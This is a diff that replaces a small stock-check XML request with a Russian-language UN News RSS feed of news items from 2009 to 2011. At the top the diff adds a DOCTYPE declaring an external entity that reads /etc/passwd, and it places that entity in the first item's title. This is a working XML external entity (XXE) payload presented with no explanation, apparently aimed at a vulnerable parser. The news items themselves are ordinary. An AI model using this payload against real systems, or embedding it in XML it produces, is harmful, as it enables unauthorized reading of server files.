@@ -1,2 +1,254 @@
-<?xml version="1.0" encoding="UTF-8"?>
-<stockCheck><productId>ernoeirfoif</productId></stockCheck>
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<rss version="2.0" xml:base="https://news.un.org/ru/" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:yandex="http://news.yandex.ru" xmlns:media="http://search.yahoo.com/mrss/">
+  <channel>
+    <title>Новости ООН - Глобальный взгляд Человеческие судьбы</title>
+    <link>https://news.un.org/ru/</link>
+    <description><![CDATA[Новости ООН - Глобальный взгляд Человеческие судьбы | un]]></description>
+    <language>ru</language>
+        <atom:link rel="self" href="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml"></atom:link>
+<lastBuildDate>Mon, 10 Feb 2025 15:45:15 -0500</lastBuildDate>
+<pubDate>Thu, 01 Dec 11 07:00:00 -0500</pubDate>
+<item>
+  <title>&xxe;</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/12/1192571</link>
+  <description>Сегодня руководитель аппарата Генерального секретаря ООН Виджай Намбиар объявил о решении Пан Ги Муна в ближайшие полгода сменить восемь своих заместителей и пять помощников. Представитель генсека отметил, что, сообщая об этом решении заранее, глава ООН  дает время для поиска и выдвижения подходящих кандидатов на это посты.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/12/1192571</guid>
+                                              <pubDate>Thu, 01 Dec 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Беларусь и Куба избраны в члены ЭКОСОС</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/10/1191961</link>
+  <description>В состав Экономического и Социального Совета ООН избраны 18 новых членов, в том числе Беларусь и Куба. Это главный орган, координирующий работу многочисленных учреждений ООН, работающих на социально-экономическом и гуманитарном направлениях.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/10/1191961</guid>
+                                              <pubDate>Mon, 24 Oct 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Азербайджан и Кыргызстан будут бороться за места непостоянных членов Совета Безопасности ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/10/1191891</link>
+  <description>21 октября Генеральная Ассамблея проведет выборы пяти новых непостоянных  членов Совета Безопасности ООН на 2012-2013 годы. На одно место от группы восточноевропейских государств претендуют Азербайджан, Венгрия и Словения.</description>
+        <enclosure url="https://global.unitednations.entermediadb.net/assets/mediadb/services/module/asset/downloads/preset/assets/2011/08/13094/image560x340cropped.jpg" length="62448" type="image/jpeg" />
+                <guid isPermaLink="true">https://news.un.org/ru/story/2011/10/1191891</guid>
+                                              <pubDate>Thu, 20 Oct 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Министр финансов Франции Кристина Лагард назначена главой МВФ</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/06/1185851</link>
+  <description>Министр финансов Франции Кристина Лагард назначена на должность директора-распорядителя Международного валютного фонда (МВФ). Она заменит на этом посту Доминика Стросс-Кана.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/06/1185851</guid>
+                                              <pubDate>Tue, 28 Jun 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Жозе Грациану да Силва избран новым Генеральным директором ФАО</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/06/1185671</link>
+  <description>Жозе Грациану да Силва из Бразилии избран новым Генеральным директором Продовольственной и сельскохозяйственной организации ООН (ФАО) на срок с 1 января 2012 до 31 июля 2015 года. Он сменит на этом посту Жака Диуфа из Сенегала, который возглавляет Организацию с 1994 года.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/06/1185671</guid>
+                                              <pubDate>Mon, 27 Jun 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Пан Ги Мун официально объявил о решении переизбираться на второй   срок</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/06/1184391</link>
+  <description>Генеральный секретарь Пан Ги Мун официально объявил о своем  решении переизбираться на второй срок. Об этом он сообщил в штаб-квартире ООН в Нью-Йорке на пресс-конференции для журналистов.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/06/1184391</guid>
+                                              <pubDate>Mon, 06 Jun 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Кандидаты на пост главы ФАО представили свои предвыборные программы</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/04/1181241</link>
+  <description>Сегодня в штаб-квартире Продовольственной и сельскохозяйственной организации Объединенных Наций (ФАО) прошло заседание, на котором кандидаты на пост ее главы рассказали о своих предвыборных программах и приоритетах.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/04/1181241</guid>
+                                              <pubDate>Wed, 13 Apr 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Касымжомарт Токаев из Казахстана назначен Генеральным директором отделения ООН в Женеве</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/03/1179861</link>
+  <description>Касымжомарт  Токаев из Казахстана назначен Генеральным директором отделения ООН в Женеве. Он стал первым представителем Азии  на этом посту и  заменит на нем российского дипломата  Сергея Орджоникидзе.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/03/1179861</guid>
+                                              <pubDate>Fri, 11 Mar 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Каддафи решил  назначить бывшего председателя Генеральной Ассамблеи новым Постоянным представителем Ливии  при ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/03/1179451</link>
+  <description>Генеральный секретарь Пан Ги Мун  получил письмо от ливийского правительства, в котором сообщается о назначении Али Абдель Салам ат-Трейки новым Постоянным представителем этой страны при ООН. Али Абдель Салам ат-Трейки был председателем 64-й сессии Генеральной  Ассамблеи, которая завершилась в сентябре 2010 года.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/03/1179451</guid>
+                                              <pubDate>Fri, 04 Mar 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>ООН разорвала договор с  дочерью Каддафи, как своим Послом  доброй воли</title>
+  <link>https://news.un.org/feed/view/ru/story/2011/02/1178781</link>
+  <description>Дочь лидера Ливии Муамара Каддафи в 2009 году была назначена Послом доброй воли Программы развития  ООН (ПРООН).  Аиша Каддафи была вовлечена в   реализацию проектов ООН, направленных на борьбу с ВИЧ и насилием в отношении женщин.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2011/02/1178781</guid>
+                                              <pubDate>Wed, 23 Feb 2011 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>ООН отреагировала на сообщения с сайта WikiLeaks</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/11/1174101</link>
+  <description>В связи с недавними публикациями на сайте WikiLeaks, пресс-секретарь ООН сообщил журналистам  о том, что ООН не будет выступать с комментариями относительно подлинности размещенного на сайте документа, который, якобы, требует собирать информацию о высокопоставленных сотрудниках Организации и их деятельности.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/11/1174101</guid>
+                                              <pubDate>Mon, 29 Nov 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>ООН будет глядеть на мир из новых окон</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/11/1174131</link>
+  <description>В Нью-Йорке продолжаются работы  по капитальному ремонту здания штаб-квартиры ООН на Ист-Ривер.  Сегодня  строители  приступили к установке новых стеклопакетов c двойным остеклением на наружных стенах здания Секретариата.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/11/1174131</guid>
+                                              <pubDate>Mon, 29 Nov 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Лишь 13 из 192 государств выполнили все свои финансовые обязательства перед ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/10/1171701</link>
+  <description>Многие государства из-за глобальной рецессии не выполнили свои финансовые  обязательства перед ООН. На сегодняшний день лишь 13 из 192 государств полностью рассчитались с Организаций. Об этом на пресс-конференции ООН сообщила заместитель Генерального секретаря ООН по вопросам управления Ангела Кане.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/10/1171701</guid>
+                                              <pubDate>Fri, 15 Oct 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Бывший  мэр Барселоны избран главой Программы ООН по населенным пунктам</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/08/1168921</link>
+  <description>Сегодня Генеральная Ассамблея ООН избрала бывшего мэра Барселоны Хоана Клоса Директором-исполнителем Программы  ООН по населенным пунктам (ООН-Хабитат) в ранге заместителя Генерального секретаря.  Он заменит на этом посту гражданку  Танзании Анну Тибайджуку.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/08/1168921</guid>
+                                              <pubDate>Wed, 25 Aug 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Карман Ляпуант  из Канады  назначен новым «главным следователем»  в ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/07/1167401</link>
+  <description>Генеральный секретарь Пан  Ги Мун приветствовал  согласие Генеральной Ассамблеи ООН с  его предложением о назначении  Карман Ляпуант из Канады  своим заместителем по вопросам служб внутреннего надзора.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/07/1167401</guid>
+                                              <pubDate>Wed, 28 Jul 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>ООН назначила голливудского актера Эдварда Нортона Послом доброй воли по сохранению биоразнообразия</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/07/1166521</link>
+  <description>Сегодня знаменитый американский актер Эдвард Нортон получил новую роль. Генеральный секретарь Пан Ги Мун назначил его Послом доброй воли ООН по сохранению биоразнообразия. Нортон выразил надежду на то, что его имя поможет привлечь внимание широкой общественности к идеалам, провозглашаемым ООН, и к деятельности этой организации.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/07/1166521</guid>
+                                              <pubDate>Thu, 08 Jul 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Архивы международных трибуналов по бывшей Югославии  и по Руанде должны  оставаться собственностью ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/06/1165681</link>
+  <description>Сегодня Совет Безопасности провел заседание, посвященное рассмотрению докладов Международного трибунала по бывшей Югославии (МТБЮ) и Международного трибунала по Руанде (МТР).</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/06/1165681</guid>
+                                              <pubDate>Fri, 18 Jun 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Беларусь возглавит Комитет, определяющий стратегические направления деятельности  ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/06/1164861</link>
+  <description>В штаб-квартире ООН начала свою работу 50-я сессия Комитета по программе и координации (КПК). Она продлится до 2 июля.  В качестве основного вспомогательного органа Экономического и Социального Совета и Генеральной Ассамблеи по планированию, составлению программ и координации, КПК определит стратегические направления работы ООН на период 2012-2013 годов.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/06/1164861</guid>
+                                              <pubDate>Fri, 04 Jun 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>ООН готовится к празднованию Дня русского языка</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/06/1164781</link>
+  <description>6 июня — в день рождения великого поэта Александра Пушкина — в ООН отмечается День русского языка. В этом году он попал на воскресенье, и поэтому все праздничные мероприятия  пройдут 8 июня. Накануне Департамент общественной информации Секретариата ООН подготовил  веб-сайт, где собраны сведения о русскоязычных ресурсах Организации.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/06/1164781</guid>
+                                              <pubDate>Thu, 03 Jun 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Дипломат из Коста-Рики назначена новым координатором деятельности ООН в области изменения климата</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/05/1163831</link>
+  <description>Дипломат из Коста-Рики Кристиана Фигерес назначена новым Исполнительным секретарем Рамочной конвенции об изменении климата. Она заменит на этом посту Иво де Бура, который еще в феврале сообщил о своем решении уйти в отставку.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/05/1163831</guid>
+                                              <pubDate>Mon, 17 May 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Бывший советник президента Клинтона Энтони Лейк назначен Исполнительным директором Детского фонда ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/03/1160751</link>
+  <description>Сегодня Генеральный секретарь Пан Ги Мун объявил о назначении бывшего советника президента США Билла Клинтона Энтони Лейка Исполнительным директором Детского фонда ООН (ЮНИСЕФ). Он заменит на этом посту свою соотечественницу Энн Венеман.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/03/1160751</guid>
+                                              <pubDate>Tue, 16 Mar 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Легендарный  игрок в  крикет Сашин Тендулкар   назначен Послом доброй воли ЮНЕП</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/03/1160471</link>
+  <description>Легендарный игрок в крикет Сашин Тендулкар из Индии назначен Послом доброй воли Программы ООН по окружающей среде (ЮНЕП).</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/03/1160471</guid>
+                                              <pubDate>Thu, 11 Mar 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Футболист испанской «Барселоны» Лионель Месси будет назначен Послом доброй воли ЮНИСЕФ</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/03/1160411</link>
+  <description>Нападающий испанской «Барселоны», аргентинец Лионель Месси станет Послом доброй воли Детского фонда ООН (ЮНИСЕФ). Это знак признания его приверженности защите интересов детей во всем мире.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/03/1160411</guid>
+                                              <pubDate>Wed, 10 Mar 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>В Международный женский день Ан-Мари Орлер  из Швеции назначена главным  полицейским ООН</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/03/1160241</link>
+  <description>В Международный женский день Генеральный секретарь Пан Ги  Мун  назначил шведку Ан-Мари Орлер главным полицейским советником ООН. Она будет возглавлять управление полиции в Департаменте операций по поддержанию мира  Секретариата ООН.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/03/1160241</guid>
+                                              <pubDate>Mon, 08 Mar 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Число женщин на постах заместителей и помощников Генерального секретаря ООН увеличилось на  40%</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/03/1160041</link>
+  <description>Сегодня в штаб-квартире ООН в Нью-Йорке состоялось специальное  торжественное мероприятие, посвященное Международному  женскому дню. Обращаясь к его участникам, Генеральный секретарь  Пан Ги Мун заявил, что он привержен борьбе за права женщин не только в силу занимаемой должности,  но и как муж, отец и дедушка, у которого есть внучки.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/03/1160041</guid>
+                                              <pubDate>Wed, 03 Mar 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>6 июня в ООН будет отмечаться День русского языка</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/02/1159371</link>
+  <description>21 февраля отмечается Международный день родного языка. Эта инициатива направлена на уважение всех существующих в мире языков и культур, которые они отражают, а также на поощрение их использования.  Накануне этой даты  Департамент общественной  информации   Секретариата  ООН  выступил с  инициативой о проведении дней официальных языков ООН. 6 июня будет отмечаться День русского языка.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/02/1159371</guid>
+                                              <pubDate>Fri, 19 Feb 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Спустя два месяца после  конференции в Копенгагене Иво де Бур объявил об уходе  в отставку</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/02/1159321</link>
+  <description>Исполнительный секретарь Рамочной конвенции об изменении климата Иво де Бур сообщил о своем решении уйти в отставку, заявив, что намерен и дальше заниматься проблемой глобального  потепления, но в рамках частного сектора и науки.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/02/1159321</guid>
+                                              <pubDate>Thu, 18 Feb 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Штаб-квартира ООН закрыта из-за снежной бури</title>
+  <link>https://news.un.org/feed/view/ru/story/2010/02/1158961</link>
+  <description>Из-за снежной бури, обрушившейся на восточное побережье США, в среду была закрыта штаб-квартира ООН в Нью-Йорке и все временные помещения, в которых на период капитального ремонта расположились подразделения Секретариата. Здание штаб-квартиры, и так полупустое в связи с ремонтом, выглядит совершенно безлюдным.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2010/02/1158961</guid>
+                                              <pubDate>Wed, 10 Feb 2010 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Накануне  Нового года Генеральный секретарь напомнил  мировым лидерам о копенгагенских договоренностях</title>
+  <link>https://news.un.org/feed/view/ru/story/2009/12/1156941</link>
+  <description>Накануне Нового года Генеральный секретарь ООН Пан Ги Мун позвонил лидерам многих стран мира и напомнил им о договоренностях в Копенгагене.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2009/12/1156941</guid>
+                                              <pubDate>Wed, 30 Dec 2009 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+<item>
+  <title>Новый Посланец мира ООН Стиви Уандер займется защитой  прав  инвалидов</title>
+  <link>https://news.un.org/feed/view/ru/story/2009/12/1155841</link>
+  <description>Сегодня в штаб-квартире  ООН в Нью-Йорке Генеральный секретарь Пан Ги Мун официально представил знаменитого американского музыканта и певца Стиви Уандера в качестве Посланца мира ООН. Это мероприятие было приурочено к Международному дню инвалидов, поскольку Стиви Уандеру поручено заниматься вопросами защиты прав этой категории лиц.</description>
+        <guid isPermaLink="true">https://news.un.org/ru/story/2009/12/1155841</guid>
+                                              <pubDate>Thu, 03 Dec 2009 12:00:00 +0000</pubDate>
+                                              <source url="https://news.un.org/feed/subscribe/ru/tags/un/feed/rss.xml">Новости ООН - Глобальный взгляд Человеческие судьбы</source>
+                                        </item>
+</channel>
+</rss>
